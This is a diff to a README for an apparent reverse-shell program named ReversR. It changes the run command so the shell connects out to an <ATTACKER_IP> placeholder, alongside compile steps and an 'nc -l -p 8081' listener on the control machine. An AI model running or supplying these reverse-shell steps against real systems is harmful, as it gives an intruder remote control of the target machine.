@@ -19,7 +19,7 @@ A reverse shell is a fundamental concept in network security and penetration tes
    gcc ReversR.c -o ReverseR
 3. Run the reverse shell on the target machine:
 	```bash
-	./ReversR.exe <TARGET_IP>
+	./ReversR.exe <ATTACKER_IP>
 4. Set up the listener on your control machine:
 	```bash
 	nc -l -p 8081
